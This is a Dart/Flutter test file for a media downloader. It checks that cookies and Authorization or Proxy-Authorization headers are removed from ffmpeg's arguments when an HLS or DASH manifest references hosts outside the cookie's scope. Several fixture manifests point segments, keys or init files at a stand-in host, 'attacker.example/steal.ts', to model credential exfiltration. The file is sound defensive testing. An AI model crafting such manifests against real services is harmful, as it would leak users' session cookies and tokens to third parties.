import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:mida/core/download/hls_ffmpeg_downloader.dart';
import 'package:mida/core/extractors/media_models.dart';

/// Phase 6 B-R3-5 (revising B-R3). ffmpeg has no per-request-host header
/// concept: the one `-headers` blob (cookie included) is sent to the
/// manifest AND to every segment/key/map/rendition it references. A
/// manifest fetched with a cookie that then points at a host outside that
/// cookie's own scope would therefore post the session cookie to that
/// host.
///
/// Round 2 refused such a download outright. Round 3 does not: refusing
/// blocked legitimate streams whose segments live on a partner CDN, and
/// the leak is closed just as completely by not handing ffmpeg the cookie
/// at all. So the contract these tests pin is: **the cookie never reaches
/// ffmpeg's args when any reference is out of scope**, and the download
/// otherwise proceeds.
///
/// In scope, precisely: the manifest URL's own host, plus any host to
/// which `CookieScope` would itself send every cookie pair currently in
/// the outgoing header (a `.example.invalid` domain cookie covers
/// `cdn.example.invalid`; a host-only `media.example.invalid` cookie
/// covers nothing else).
Future<List<InternetAddress>> _fakePublicResolver(String host) async => [InternetAddress('93.184.216.34')];

const _mpegurl = 'application/vnd.apple.mpegurl';

/// Captures the args `downloadVerified` built instead of ever spawning
/// ffmpeg, so a test can inspect the `-headers` blob directly.
class _ArgsCapturingDownloader extends HlsFfmpegDownloader {
  List<String>? capturedArgs;

  _ArgsCapturingDownloader(HttpClient Function() clientFactory)
      : super(httpClientFactory: clientFactory, resolveHost: _fakePublicResolver);

  @override
  Future<void> run(
    List<String> args, {
    Duration? totalDuration,
    void Function(double progress)? onProgress,
    Duration? processTimeout,
  }) async {
    capturedArgs = args;
  }
}

/// Serves [body] for any request and pins an `HttpClient` at it, so a
/// test can use realistic public hostnames without any DNS or real
/// network involvement.
Future<HttpClient Function()> _pinnedClientServing(String body) async {
  final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
  addTearDown(() => server.close(force: true));
  server.listen((request) async {
    request.response.headers.contentType = ContentType.parse(_mpegurl);
    request.response.write(body);
    await request.response.close();
  });
  return () {
    final client = HttpClient();
    client.connectionFactory =
        (uri, proxyHost, proxyPort) => Socket.startConnect(InternetAddress.loopbackIPv4, server.port);
    return client;
  };
}

const _domainCookie = {
  '.example.invalid': [
    CookieEntry(domain: '.example.invalid', path: '/', secure: false, name: 'sid', value: 'secret'),
  ],
};
const _hostOnlyCookie = {
  'media.example.invalid': [
    CookieEntry(domain: 'media.example.invalid', path: '/', secure: false, name: 'sid', value: 'secret'),
  ],
};

const _manifestUrl = 'http://media.example.invalid/media.m3u8';

void main() {
  late Directory tempDir;

  setUp(() async {
    tempDir = await Directory.systemTemp.createTemp('mida_hls_cookie_containment_');
  });

  tearDown(() async {
    if (await tempDir.exists()) await tempDir.delete(recursive: true);
  });

  /// Runs a download against [body] and returns the `-headers` blob
  /// ffmpeg would have received (empty string when no `-headers` arg was
  /// emitted at all, which is itself a valid "no cookie" outcome).
  Future<String> headerBlobFor(
    String body, {
    Map<String, List<CookieEntry>>? cookiesByDomain,
    Map<String, String> headers = const {},
  }) async {
    final downloader = _ArgsCapturingDownloader(await _pinnedClientServing(body));
    await downloader.downloadVerified(
      url: _manifestUrl,
      outputPath: '${tempDir.path}/out.mp4',
      cookiesByDomain: cookiesByDomain,
      headers: headers,
    );
    final args = downloader.capturedArgs!;
    final index = args.indexOf('-headers');
    return index == -1 ? '' : args[index + 1];
  }

  group('a reference outside the cookie scope strips the cookie instead of refusing the download', () {
    test('guard can fail: a segment on an unrelated host leaves the cookie out of ffmpeg args entirely',
        () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXTINF:10,\nhttp://attacker.example/steal.ts\n',
        cookiesByDomain: _domainCookie,
      );
      expect(blob, isNot(contains('sid=secret')));
      expect(blob.toLowerCase(), isNot(contains('cookie')));
      // Guard can fail (see report): making
      // `HlsFfmpegDownloader._headersForFfmpeg` return `headers`
      // unchanged (i.e. never stripping) made this and the three tests
      // below fail - every one of them handed ffmpeg
      // `Cookie: sid=secret` in the same global -headers blob it applies
      // to attacker.example.
    });

    test('guard can fail: an #EXT-X-KEY on an unrelated host strips the cookie (the decryption key request '
        'carries the same global -headers)', () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXT-X-KEY:METHOD=AES-128,URI="http://attacker.example/key.bin"\n'
        '#EXTINF:10,\nhttp://cdn.example.invalid/seg.ts\n',
        cookiesByDomain: _domainCookie,
      );
      expect(blob, isNot(contains('sid=secret')));
    });

    test('guard can fail: an #EXT-X-MAP init segment on an unrelated host strips the cookie', () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXT-X-MAP:URI="http://attacker.example/init.mp4"\n'
        '#EXTINF:10,\nhttp://cdn.example.invalid/seg.m4s\n',
        cookiesByDomain: _domainCookie,
      );
      expect(blob, isNot(contains('sid=secret')));
    });

    test('a DASH BaseURL on an unrelated host strips the cookie too', () async {
      final blob = await headerBlobFor(
        '<?xml version="1.0"?><MPD><Period><AdaptationSet><Representation>'
        '<BaseURL>http://attacker.example/seg.mp4</BaseURL>'
        '</Representation></AdaptationSet></Period></MPD>',
        cookiesByDomain: _domainCookie,
      );
      expect(blob, isNot(contains('sid=secret')));
    });

    test('a host-only cookie does NOT put a sibling subdomain in scope, so the cookie is stripped', () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXTINF:10,\nhttp://cdn.example.invalid/seg.ts\n',
        cookiesByDomain: _hostOnlyCookie,
      );
      expect(blob, isNot(contains('sid=secret')));
    });

    test('a cookie flattened into headers with no cookiesByDomain to prove its scope is stripped for any '
        'cross-host reference (fail closed)', () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXTINF:10,\nhttp://cdn.example.invalid/seg.ts\n',
        headers: const {'Cookie': 'sid=secret'},
      );
      expect(blob, isNot(contains('sid=secret')));
    });
  });

  test('the scan itself still fetches the manifest WITH the cookie: only ffmpeg is denied it', () async {
    String? cookieSeenByManifestRequest;
    final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
    addTearDown(() => server.close(force: true));
    server.listen((request) async {
      cookieSeenByManifestRequest = request.headers.value('cookie');
      request.response.headers.contentType = ContentType.parse(_mpegurl);
      request.response.write('#EXTM3U\n#EXTINF:10,\nhttp://attacker.example/steal.ts\n');
      await request.response.close();
    });

    final downloader = _ArgsCapturingDownloader(() {
      final client = HttpClient();
      client.connectionFactory =
          (uri, proxyHost, proxyPort) => Socket.startConnect(InternetAddress.loopbackIPv4, server.port);
      return client;
    });
    await downloader.downloadVerified(
      url: _manifestUrl,
      outputPath: '${tempDir.path}/out.mp4',
      cookiesByDomain: _domainCookie,
    );

    // The manifest is authenticated content: scanning it without the
    // cookie would have read a login wall and (since B-R3-1) refused.
    expect(cookieSeenByManifestRequest, 'sid=secret');
    final args = downloader.capturedArgs!;
    expect(args.join(' '), isNot(contains('sid=secret')));
  });

  group('a manifest that stays inside the cookie scope keeps its cookie', () {
    test('a host the cookie\'s own Domain= covers (cdn.example.invalid under .example.invalid) keeps it',
        () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXTINF:10,\nhttp://cdn.example.invalid/seg.ts\n',
        cookiesByDomain: _domainCookie,
      );
      expect(blob, contains('Cookie: sid=secret'));
    });

    test('the manifest\'s own host is always in scope', () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXTINF:10,\nhttp://media.example.invalid/seg.ts\n',
        cookiesByDomain: _hostOnlyCookie,
      );
      expect(blob, contains('Cookie: sid=secret'));
    });

    test('a flattened cookie survives when every reference is on the manifest\'s own host', () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXTINF:10,\nhttp://media.example.invalid/seg.ts\n',
        headers: const {'Cookie': 'sid=secret'},
      );
      expect(blob, contains('Cookie: sid=secret'));
    });

    test('no cookie at all means nothing to strip: a cross-host segment is fine and other headers survive',
        () async {
      final blob = await headerBlobFor(
        '#EXTM3U\n#EXTINF:10,\nhttp://attacker.example/seg.ts\n',
        headers: const {'Referer': 'http://media.example.invalid/'},
      );
      expect(blob, contains('Referer: http://media.example.invalid/'));
    });
  });

  group('B-R4-3: Authorization and Proxy-Authorization are stripped alongside Cookie', () {
    test('guard can fail: an Authorization bearer token is removed from ffmpeg args when a reference is out '
        'of the manifest\'s own scope', () async {
      final downloader = _ArgsCapturingDownloader(await _pinnedClientServing(
        '#EXTM3U\n#EXTINF:10,\nhttp://attacker.example/steal.ts\n',
      ));
      await downloader.downloadVerified(
        url: _manifestUrl,
        outputPath: '${tempDir.path}/out.mp4',
        headers: const {'Authorization': 'Bearer sekrit-token', 'Cookie': 'sid=secret'},
      );
      final blob = downloader.capturedArgs!.join(' ');
      expect(blob, isNot(contains('sekrit-token')));
      expect(blob.toLowerCase(), isNot(contains('authorization')));
      // Guard can fail (see report): before B-R4-3, `_headersForFfmpeg`
      // only stripped a header literally named `Cookie` - this
      // `Authorization` bearer token rode along into ffmpeg's `-headers`
      // blob (sent to attacker.example just as much as the manifest's own
      // host) unless this same reference-out-of-scope path also removes it.
    });

    test('guard can fail: a Proxy-Authorization header is removed the same way', () async {
      final downloader = _ArgsCapturingDownloader(await _pinnedClientServing(
        '#EXTM3U\n#EXTINF:10,\nhttp://attacker.example/steal.ts\n',
      ));
      await downloader.downloadVerified(
        url: _manifestUrl,
        outputPath: '${tempDir.path}/out.mp4',
        headers: const {'Proxy-Authorization': 'Basic dXNlcjpwYXNz', 'Cookie': 'sid=secret'},
      );
      final blob = downloader.capturedArgs!.join(' ');
      expect(blob, isNot(contains('dXNlcjpwYXNz')));
      expect(blob.toLowerCase(), isNot(contains('proxy-authorization')));
    });

    test('an Authorization header survives when every reference stays in scope', () async {
      final downloader = _ArgsCapturingDownloader(await _pinnedClientServing(
        '#EXTM3U\n#EXTINF:10,\nhttp://media.example.invalid/seg.ts\n',
      ));
      await downloader.downloadVerified(
        url: _manifestUrl,
        outputPath: '${tempDir.path}/out.mp4',
        headers: const {'Authorization': 'Bearer sekrit-token'},
      );
      final blob = downloader.capturedArgs!.join(' ');
      expect(blob, contains('sekrit-token'));
    });
  });

  group('B-R4-8: the credential strip is reported through onStatus, not only debugPrint', () {
    test('guard can fail: onStatus receives a message when a credential is stripped', () async {
      final downloader = _ArgsCapturingDownloader(await _pinnedClientServing(
        '#EXTM3U\n#EXTINF:10,\nhttp://attacker.example/steal.ts\n',
      ));
      final messages = <String>[];
      await downloader.downloadVerified(
        url: _manifestUrl,
        outputPath: '${tempDir.path}/out.mp4',
        headers: const {'Cookie': 'sid=secret'},
        onStatus: messages.add,
      );
      expect(messages, isNotEmpty);
      expect(messages.single.toLowerCase(), contains('not sending'));
      // Guard can fail (see report): dropping the `onStatus?.call(message)`
      // line from `_headersForFfmpeg` leaves this list empty - the strip
      // still happens (debugPrint still fires) but nothing reaches a
      // caller-supplied channel, so a UI has no way to surface it.
    });

    test('onStatus is never called when nothing was stripped', () async {
      final downloader = _ArgsCapturingDownloader(await _pinnedClientServing(
        '#EXTM3U\n#EXTINF:10,\nhttp://media.example.invalid/seg.ts\n',
      ));
      final messages = <String>[];
      await downloader.downloadVerified(
        url: _manifestUrl,
        outputPath: '${tempDir.path}/out.mp4',
        headers: const {'Cookie': 'sid=secret'},
        onStatus: messages.add,
      );
      expect(messages, isEmpty);
    });

    test('a caller that passes no onStatus is unaffected (the strip still happens)', () async {
      final downloader = _ArgsCapturingDownloader(await _pinnedClientServing(
        '#EXTM3U\n#EXTINF:10,\nhttp://attacker.example/steal.ts\n',
      ));
      await downloader.downloadVerified(
        url: _manifestUrl,
        outputPath: '${tempDir.path}/out.mp4',
        headers: const {'Cookie': 'sid=secret'},
      );
      expect(downloader.capturedArgs!.join(' '), isNot(contains('sid=secret')));
    });
  });
}
